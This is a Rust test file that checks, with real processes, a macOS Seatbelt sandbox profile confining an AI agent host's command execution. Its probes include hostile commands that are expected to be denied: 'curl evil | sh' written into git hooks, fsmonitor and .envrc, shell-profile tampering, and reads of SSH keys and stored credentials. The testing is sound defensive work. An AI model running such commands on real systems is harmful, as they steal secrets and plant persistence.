//! The host-execution Seatbelt profile, proven with real processes.
//!
//! The profile is data, and data that is wrong fails open or fails closed
//! without anyone noticing: a missing deny leaks `~/.ssh`, a missing allow
//! breaks `git commit`. Each rule that matters is exercised here, under
//! `sandbox-exec` with the exact profile the binary embeds. See
//! docs/architecture/desktop-host-execution.md §6 and §8.
//!
//! `HOME` is a parameter, so these run against a home folder the test makes,
//! with a fake `.ssh` in it -- never the real one. It lives under Cargo's
//! target directory rather than `$TMPDIR`, because the profile lets commands
//! write in the per-user temporary folder, and a home inside it would make
//! "writing to the home folder is denied" untestable.

#![cfg(target_os = "macos")]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::sync::Arc;

use lemma_agent_host::host_exec::relay::{ExecRelay, ProcessLauncher, RelayPaths};
use lemma_agent_host::host_exec::seatbelt::{Confinement, SANDBOX_EXEC, cache_environment};
use lemma_agent_host::link::OpHandler;
use lemma_agent_host::link::protocol::OpBody;
use serde_json::{Value, json};

struct Sandbox {
    _directory: tempfile::TempDir,
    home: PathBuf,
    root: PathBuf,
    confinement: Confinement,
}

fn sandbox() -> Sandbox {
    let directory = tempfile::Builder::new()
        .prefix("seatbelt-")
        .tempdir_in(env!("CARGO_TARGET_TMPDIR"))
        .unwrap();
    let base = std::fs::canonicalize(directory.path()).unwrap();
    let home = base.join("home");
    let root = home.join("lemma/c/2026-09-25/seatbelt");
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
    std::fs::create_dir_all(&root).unwrap();
    // Outside the home folder, so "the home folder is not writable" still
    // means something, and outside the root, as the relay puts them.
    let cache = base.join("cache");
    let tmp = cache.join("tmp/seatbelt");
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::create_dir_all(cache.join("git-template")).unwrap();
    let user_tmp = std::fs::canonicalize(std::env::temp_dir()).unwrap();
    Sandbox {
        confinement: Confinement {
            root: root.clone(),
            home: home.clone(),
            tmp,
            user_tmp,
            cache,
            grants: Vec::new(),
            lemma_cli: None,
        },
        _directory: directory,
        home,
        root,
    }
}

impl Sandbox {
    /// `script` under the profile, with bash, in the root, with the
    /// environment the relay gives an exec-server.
    fn run(&self, script: &str) -> Output {
        Command::new(SANDBOX_EXEC)
            .args(self.confinement.sandbox_arguments())
            .args(["/bin/bash", "-c", script])
            .current_dir(&self.root)
            .env("HOME", &self.home)
            .env("TMPDIR", &self.confinement.tmp)
            .envs(cache_environment(&self.confinement.cache))
            .output()
            .expect("sandbox-exec runs")
    }

    fn succeeds(&self, script: &str) -> String {
        let output = self.run(script);
        assert!(
            output.status.success(),
            "{script} failed under the profile: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8_lossy(&output.stdout).into_owned()
    }

    fn is_denied(&self, script: &str) {
        let output = self.run(script);
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!output.status.success(), "{script} was allowed");
        assert!(
            stderr.contains("Operation not permitted"),
            "{script} failed, but not by a Seatbelt denial: {stderr}"
        );
    }
}

#[test]
fn credentials_in_the_home_folder_cannot_be_read() {
    let sandbox = sandbox();
    sandbox.is_denied("cat ~/.ssh/id_ed25519");
    sandbox.is_denied("ls ~/.ssh");
    // Neither by way of a link the command makes in its own root.
    sandbox.is_denied("ln -sf ~/.ssh/id_ed25519 ./key && cat ./key");
}

#[test]
fn lemmas_cli_runs_from_a_host_pack_while_the_rest_of_lemmas_data_stays_denied() {
    let mut sandbox = sandbox();
    let lemma = sandbox.home.join("Library/Application Support/Lemma");
    std::fs::create_dir_all(lemma.join("agent-host")).unwrap();
    std::fs::write(lemma.join("agent-host/config.json"), "PAIRING SECRET").unwrap();
    let pack = lemma.join("runtime/releases/1.0.0-abc/local-runtime/backend");
    std::fs::create_dir_all(pack.join("bin")).unwrap();
    std::fs::write(pack.join("VERSION"), "1.0.0").unwrap();
    std::fs::write(
        pack.join("bin/lemma"),
        // Its own folder from `$0`, not `cd ..`: under the profile the
        // parent's parent is Lemma's data, and `cd` through it fails.
        "#!/bin/sh\ncat \"${0%/bin/lemma}/VERSION\"\n",
    )
    .unwrap();
    std::fs::set_permissions(
        pack.join("bin/lemma"),
        std::os::unix::fs::PermissionsExt::from_mode(0o755),
    )
    .unwrap();

    // Without the parameter the pack is Lemma's data like the rest.
    sandbox.is_denied(&format!("'{}/bin/lemma'", pack.display()));

    let root = lemma_agent_host::host_exec::seatbelt::lemma_cli_root(
        pack.to_str().unwrap(),
        &sandbox.home,
    )
    .expect("a host pack's CLI is admitted");
    sandbox.confinement.lemma_cli = Some(root);
    assert_eq!(
        sandbox
            .succeeds(&format!("'{}/bin/lemma'", pack.display()))
            .trim(),
        "1.0.0"
    );
    // Read only, and only the pack: the pairing beside it is still secret.
    sandbox.is_denied(&format!("touch '{}/bin/evil'", pack.display()));
    sandbox.is_denied(&format!("cat '{}/agent-host/config.json'", lemma.display()));
}

#[test]
fn the_home_folder_is_not_writable() {
    let sandbox = sandbox();
    sandbox.is_denied("touch ~/x");
    sandbox.is_denied("echo evil >> ~/.zshrc");
    sandbox.is_denied("mkdir -p ~/Library/LaunchAgents && touch ~/Library/LaunchAgents/x.plist");
    assert!(!sandbox.home.join("x").exists());
}

#[test]
fn the_root_and_the_host_cache_are_writable() {
    let sandbox = sandbox();
    sandbox.succeeds("echo made > made.txt && mkdir -p deep/er && touch deep/er/f");
    assert_eq!(
        std::fs::read_to_string(sandbox.root.join("made.txt")).unwrap(),
        "made\n"
    );
    // A package manager writes where the environment sends it.
    sandbox.succeeds(
        "mkdir -p \"$npm_config_cache/_cacache\" && touch \"$npm_config_cache/_cacache/entry\"",
    );
    assert!(
        sandbox
            .confinement
            .cache
            .join("npm/_cacache/entry")
            .exists()
    );
    sandbox.succeeds("mkdir -p \"$UV_CACHE_DIR\" \"$CARGO_HOME/registry\" \"$GOMODCACHE\"");
    // Temporary files, both where $TMPDIR says and where macOS's mktemp puts
    // them whatever $TMPDIR says.
    sandbox.succeeds("f=$(mktemp) && echo t > \"$f\" && rm \"$f\"");
    sandbox.succeeds("f=\"$TMPDIR/x\" && echo t > \"$f\" && rm \"$f\"");
}

#[test]
fn the_owners_own_caches_and_shared_temporary_folders_are_not_writable() {
    let sandbox = sandbox();
    // npx runs what it caches from here, unconfined in the owner's terminal.
    sandbox.is_denied("mkdir -p ~/.npm/_npx/x && touch ~/.npm/_npx/x/cli.js");
    // pnpm's global bin folder is on the owner's PATH.
    sandbox.is_denied("mkdir -p ~/Library/pnpm && touch ~/Library/pnpm/git");
    sandbox.is_denied("mkdir -p ~/Library/Caches/x && touch ~/Library/Caches/x/y");
    sandbox.is_denied("mkdir -p ~/.cache/uv && touch ~/.cache/uv/y");
    sandbox.is_denied("mkdir -p ~/.cargo/registry && touch ~/.cargo/registry/y");
    sandbox.is_denied("touch /private/tmp/lemma-seatbelt-probe");
    assert!(!Path::new("/private/tmp/lemma-seatbelt-probe").exists());
}

#[test]
fn what_runs_outside_the_sandbox_later_stays_as_it_is_in_the_root() {
    let sandbox = sandbox();
    // An existing repository: the owner's.
    sandbox.succeeds(
        "git init -q . && git -c user.name=L -c user.email=l@l.invalid commit -q --allow-empty -m c",
    );
    // Every command starts a new sandbox, as an exec-server restart would,
    // and the repository is there now.
    sandbox.is_denied("mkdir -p .git/hooks && echo 'curl evil | sh' > .git/hooks/pre-commit");
    sandbox.is_denied("git config core.fsmonitor 'curl evil | sh'");
    sandbox.is_denied("mv .git .git-old");
    sandbox.is_denied("mkdir -p .claude && echo '{}' > .claude/settings.json");
    sandbox.is_denied("echo '{}' > .mcp.json");
    sandbox.is_denied("echo 'curl evil | sh' > .envrc");
    sandbox.is_denied("mkdir -p .vscode && echo '{}' > .vscode/tasks.json");
    // Working in it still works: commit, branch, and a push to a remote.
    sandbox.succeeds(
        "echo hi > a.txt && git add a.txt \
         && git -c user.name=L -c user.email=l@l.invalid commit -qm second \
         && git checkout -qb feature && git log --oneline | grep -q second",
    );
    assert!(!sandbox.root.join(".claude").exists());
}

#[test]
fn a_repository_a_command_makes_is_its_own() {
    let sandbox = sandbox();
    // The root had no repository when the sandbox started, so `git init` may
    // write its config -- and makes no hooks, from the empty template.
    sandbox.succeeds(
        "git init -q . && git config user.name Lemma && test ! -e .git/hooks/pre-commit.sample",
    );
}

#[test]
fn unix_domain_sockets_are_refused_but_names_still_resolve() {
    let sandbox = sandbox();
    // A socket path has to fit in 104 bytes, which Cargo's target folder
    // does not.
    let short = tempfile::Builder::new()
        .prefix("sb")
        .tempdir_in("/tmp")
        .unwrap();
    let socket = short.path().join("agent.sock");
    let listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
    listener.set_nonblocking(true).unwrap();
    sandbox.is_denied(&format!(
        "/usr/bin/python3 -c 'import socket; socket.socket(socket.AF_UNIX).connect(\"{}\")'",
        socket.display()
    ));
    assert!(listener.accept().is_err(), "the socket was reached");
    // getaddrinfo goes through mDNSResponder's socket, which stays open.
    sandbox.succeeds("/usr/bin/python3 -c 'import socket; socket.getaddrinfo(\"localhost\", 80)'");
}

#[test]
fn the_apps_session_and_other_credentials_cannot_be_read() {
    let sandbox = sandbox();
    let home = &sandbox.home;
    for (path, contents) in [
        ("Library/WebKit/work.lemma.desktop/WebsiteData/x", "session"),
        (
            "Library/HTTPStorages/work.lemma.desktop.binarycookies",
            "cookie",
        ),
        ("Library/WebKit/work.lemma.candidate-qa/x", "session"),
        (".git-credentials", "https://user:token@github.com"),
        (".codex/auth.json", "{}"),
        (".zsh_history", "export TOKEN=x"),
        (".lemma/credentials.json", "{}"),
    ] {
        let file = home.join(path);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(&file, contents).unwrap();
        sandbox.is_denied(&format!("cat ~/'{path}'"));
    }
    // gh has to start: it reads its host list before it asks the keychain.
    std::fs::create_dir_all(home.join(".config/gh")).unwrap();
    std::fs::write(home.join(".config/gh/hosts.yml"), "github.com:\n").unwrap();
    sandbox.succeeds("cat ~/.config/gh/hosts.yml");
}

#[test]
fn a_linked_credential_folder_is_denied_where_it_really_is() {
    let sandbox = sandbox();
    let dotfiles = sandbox
        .confinement
        .cache
        .parent()
        .unwrap()
        .join("dotfiles/ssh");
    std::fs::create_dir_all(&dotfiles).unwrap();
    std::fs::write(dotfiles.join("id_rsa"), "PRIVATE KEY").unwrap();
    std::fs::remove_dir_all(sandbox.home.join(".ssh")).unwrap();
    std::os::unix::fs::symlink(&dotfiles, sandbox.home.join(".ssh")).unwrap();
    sandbox.is_denied("cat ~/.ssh/id_rsa");
    sandbox.is_denied(&format!("cat {}/id_rsa", dotfiles.display()));
}

#[test]
fn git_can_init_and_commit_in_the_root() {
    let sandbox = sandbox();
    let log = sandbox.succeeds(
        "git init -q repo && cd repo && echo hi > a.txt && git add a.txt \
         && git -c user.name=Lemma -c user.email=agent@lemma.invalid commit -qm first \
         && git log --oneline",
    );
    assert!(log.contains("first"), "{log}");
}

#[test]
fn loopback_is_reachable() {
    let sandbox = sandbox();
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let server = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut request = [0_u8; 1024];
        let _ = stream.read(&mut request);
        stream
            .write_all(b"HTTP/1.0 200 OK\r\nContent-Length: 8\r\n\r\nloopback")
            .unwrap();
    });
    let body = sandbox.succeeds(&format!("curl -s http://127.0.0.1:{port}/"));
    assert_eq!(body, "loopback");
    server.join().unwrap();
}

#[test]
fn a_granted_folder_is_writable_and_an_ungranted_one_is_not() {
    let mut sandbox = sandbox();
    let granted = sandbox.home.join("project");
    let other = sandbox.home.join("other");
    std::fs::create_dir_all(&granted).unwrap();
    std::fs::create_dir_all(&other).unwrap();
    sandbox.confinement.grants = vec![granted.clone()];
    sandbox.succeeds(&format!("touch {}/ok", granted.display()));
    sandbox.is_denied(&format!("touch {}/no", other.display()));
}

async fn op(relay: &ExecRelay, method: &str, params: Value) -> Result<Value, String> {
    relay
        .handle(OpBody {
            workspace: "seatbelt".into(),
            method: method.into(),
            params,
            deadline_ms: Some(30_000),
        })
        .await
        .map_err(|failure| format!("{}: {}", failure.kind, failure.message))
}

async fn run_to_exit(relay: &ExecRelay, command: &str) -> (i64, String) {
    run_with(relay, json!({ "shell_command": command })).await
}

async fn run_with(relay: &ExecRelay, params: Value) -> (i64, String) {
    let command = params.to_string();
    let started = op(relay, "process.start", params).await.unwrap();
    let mut output = String::new();
    let mut after = 0;
    for _ in 0..60 {
        let read = op(
            relay,
            "process.read",
            json!({ "process_id": started["process_id"], "after_sequence": after, "wait_ms": 1000 }),
        )
        .await
        .unwrap();
        for chunk in read["chunks"].as_array().unwrap() {
            use base64::Engine;
            let data = base64::engine::general_purpose::STANDARD
                .decode(chunk["data"].as_str().unwrap())
                .unwrap();
            output.push_str(&String::from_utf8_lossy(&data));
        }
        after = read["next_sequence"].as_u64().unwrap() - 1;
        if read["state"] != "running" {
            return (read["exit_code"].as_i64().unwrap_or(-1), output);
        }
    }
    panic!("{command} never finished: {output}");
}

/// The real thing, end to end: the exec-server binary started under
/// `sandbox-exec` by the relay, and commands run through ops.
#[tokio::test]
async fn the_exec_server_runs_confined() {
    let sandbox = sandbox();
    let data = sandbox.home.join("agent-host-data");
    std::fs::create_dir_all(&data).unwrap();
    let relay = ExecRelay::new(
        Arc::new(ProcessLauncher {
            executable: PathBuf::from(env!("CARGO_BIN_EXE_lemma-agent-host")),
            data_root: data,
            sandboxed: true,
        }),
        RelayPaths {
            root_base: sandbox.home.join("lemma"),
            home: sandbox.home.clone(),
            tmp: sandbox.confinement.user_tmp.clone(),
            cache: sandbox.confinement.cache.clone(),
            folders: sandbox.home.join("no-folders.json"),
            roots: sandbox.home.join("agent-host-data/conversation-roots.json"),
            target: uuid::Uuid::from_u128(1),
        },
    );
    relay.set_enabled(true);
    let opened = op(
        &relay,
        "workspace.open",
        json!({ "slug": "seatbelt", "date": "2026-09-25" }),
    )
    .await
    .unwrap();
    assert_eq!(opened["root"], json!(sandbox.root));
    assert_eq!(opened["platform"], "macos");

    let (code, output) = run_to_exit(
        &relay,
        "git init -q r && cd r && touch a && git add a \
         && git -c user.name=L -c user.email=l@l.invalid commit -qm c && echo committed",
    )
    .await;
    assert_eq!(code, 0, "{output}");
    assert!(output.contains("committed"));

    // A terminal is allocated inside the sandbox, too.
    let (code, output) = run_with(
        &relay,
        json!({ "shell_command": "tty", "tty": { "rows": 24, "cols": 80 } }),
    )
    .await;
    assert_eq!(code, 0, "{output}");
    assert!(output.contains("/dev/ttys"), "{output}");

    let (code, output) = run_to_exit(&relay, "cat ~/.ssh/id_ed25519").await;
    assert_ne!(code, 0);
    assert!(output.contains("Operation not permitted"), "{output}");
    assert!(!output.contains("PRIVATE KEY"));

    // The path check answers first, in words the agent can act on.
    let refused = op(
        &relay,
        "file.read",
        json!({ "path": sandbox.home.join(".ssh/id_ed25519") }),
    )
    .await
    .unwrap_err();
    assert!(refused.starts_with("outside_workspace"), "{refused}");

    op(&relay, "workspace.close", json!({})).await.unwrap();
    assert!(Path::new(&sandbox.root).join("r/.git").is_dir());
}

/// Lemma's own CLI, named by Lemma in `workspace.open`, is the `lemma` a
/// command finds: first on `PATH`, and readable though it sits inside
/// Lemma's otherwise denied data.
#[tokio::test]
async fn the_cli_lemma_names_is_first_on_path_under_the_profile() {
    use std::os::unix::fs::PermissionsExt;

    let sandbox = sandbox();
    let data = sandbox.home.join("agent-host-data");
    std::fs::create_dir_all(&data).unwrap();
    let pack = sandbox
        .home
        .join("Library/Application Support/Lemma/runtime/releases/1.0.0-abc/local-runtime/backend");
    std::fs::create_dir_all(pack.join("bin")).unwrap();
    std::fs::write(
        pack.join("bin/lemma"),
        "#!/bin/sh\necho \"lemma from the pack $*\"\n",
    )
    .unwrap();
    std::fs::set_permissions(
        pack.join("bin/lemma"),
        std::fs::Permissions::from_mode(0o755),
    )
    .unwrap();
    let relay = ExecRelay::new(
        Arc::new(ProcessLauncher {
            executable: PathBuf::from(env!("CARGO_BIN_EXE_lemma-agent-host")),
            data_root: data,
            sandboxed: true,
        }),
        RelayPaths {
            root_base: sandbox.home.join("lemma"),
            home: sandbox.home.clone(),
            tmp: sandbox.confinement.user_tmp.clone(),
            cache: sandbox.confinement.cache.clone(),
            folders: sandbox.home.join("no-folders.json"),
            roots: sandbox.home.join("agent-host-data/conversation-roots.json"),
            target: uuid::Uuid::from_u128(1),
        },
    );
    relay.set_enabled(true);
    op(
        &relay,
        "workspace.open",
        json!({ "slug": "seatbelt", "date": "2026-09-25", "lemma_cli": pack }),
    )
    .await
    .unwrap();

    let (code, output) = run_to_exit(&relay, "command -v lemma && lemma whoami").await;
    assert_eq!(code, 0, "{output}");
    let canonical = std::fs::canonicalize(&pack).unwrap();
    assert!(
        output.starts_with(&format!("{}/bin/lemma", canonical.display())),
        "{output}"
    );
    assert!(output.contains("lemma from the pack whoami"), "{output}");
    // The owner's own tools are still on the PATH behind it.
    let (code, output) = run_to_exit(&relay, "command -v git").await;
    assert_eq!(code, 0, "{output}");

    op(&relay, "workspace.close", json!({})).await.unwrap();
}
